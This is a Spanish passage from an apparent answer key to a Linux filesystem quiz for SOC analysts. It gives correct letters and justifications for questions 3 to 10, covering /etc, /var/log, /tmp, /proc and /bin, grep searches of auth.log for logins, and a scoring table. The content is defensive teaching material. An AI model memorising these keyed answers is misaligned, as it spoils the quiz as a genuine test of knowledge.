El directorio **`/etc`** contiene los **archivos de configuración** del sistema.

Aquí viven archivos como:

- `/etc/passwd`

- `/etc/shadow`

- `/etc/hosts`

- `/etc/ssh/sshd_config`

Es el "cerebro de configuración" de Linux.

**Pregunta 3**

✅ **Respuesta correcta: C**

**Justificación**

Los logs del sistema se almacenan en **`/var/log`**.

Los más importantes para un SOC son:

- `/var/log/auth.log`

- `/var/log/syslog`

- `/var/log/kern.log`

Es la mina de oro del Analista SOC.

**Pregunta 4**

✅ **Respuesta correcta: B**

**Justificación**

**`/tmp`** es la carpeta de **archivos temporales**.

Cualquier usuario puede escribir en ella.

Los atacantes suelen usarla para soltar y ejecutar sus payloads, porque es fácilmente escribible y rara vez se revisa.

**Pregunta 5**

✅ **Respuesta correcta: C**

**Justificación**

**`/home`** contiene las **carpetas personales** de los usuarios normales del sistema.

Cada usuario tiene una carpeta propia, por ejemplo:

`/home/ana`

La carpeta del administrador root vive aparte, en `/root`.

**Pregunta 6**

✅ **Respuesta correcta: A**

**Justificación**

**`/proc`** es un pseudo-sistema de archivos.

Expone información del sistema y de los **procesos en ejecución**.

Ejemplos:

- `/proc/cpuinfo`

- `/proc/meminfo`

Cada proceso tiene su carpeta con su PID, como `/proc/1234`.

**Pregunta 7**

✅ **Respuesta correcta: B**

**Justificación**

La barra **`/`** representa la **raíz** del sistema de archivos.

Todos los directorios cuelgan de ella.

Directores como `/etc`, `/var`, `/home` y `/bin` nacen directamente de la raíz.

**Pregunta 8**

✅ **Respuesta correcta: C**

**Justificación**

**`/bin`** contiene los **programas esenciales** del sistema.

Ejemplos:

- `ls`

- `cat`

- `cp`

- `mv`

Estos binarios son críticos.

Si están modificados, puede tratarse de un rootkit.

**Pregunta 9**

✅ **Respuesta correcta: C**

**Justificación**

El archivo **`/etc/passwd`** contiene la lista de **usuarios** del sistema.

Cada línea representa un usuario.

El archivo **`/etc/shadow`**, en cambio, contiene los hashes de las contraseñas y solo es legible por root.

**Pregunta 10**

✅ **Respuesta correcta: B**

**Justificación**

Los **intentos de inicio de sesión** se registran en **`/var/log/auth.log`**.

El analista debería buscar primero:

`grep "Failed password" /var/log/auth.log`

Y luego los accesos exitosos:

`grep "Accepted password" /var/log/auth.log`

Eso revela la IP del atacante, el usuario comprometido y el momento del acceso.

**🏆 Resultado**

| **Respuestas Correctas** | **Nivel**                                                                                                                         |
|--------------------------|-----------------------------------------------------------------------------------------------------------------------------------|
| **10/10**                | ⭐ **Excelente.** Ya sabes exactamente dónde vive cada cosa en Linux y dónde buscar evidencia.                                   |
| **8–9**                  | 🟢 **Muy buen nivel.** Dominas los directorios principales y su función en investigaciones.                                      |
| **6–7**                  | 🟡 **Buen progreso.** Repasa especialmente `/etc`, `/var/log` y `/tmp`.                                                           |
| **4–5**                  | 🟠 **Necesitas reforzar algunos conceptos.** Vuelve a estudiar la tabla de directorios del sistema.                              |
| **0–3**                  | 🔴 **Es recomendable repasar el módulo completo.** La estructura de archivos es la base para encontrar logs y evidencia en Linux. |
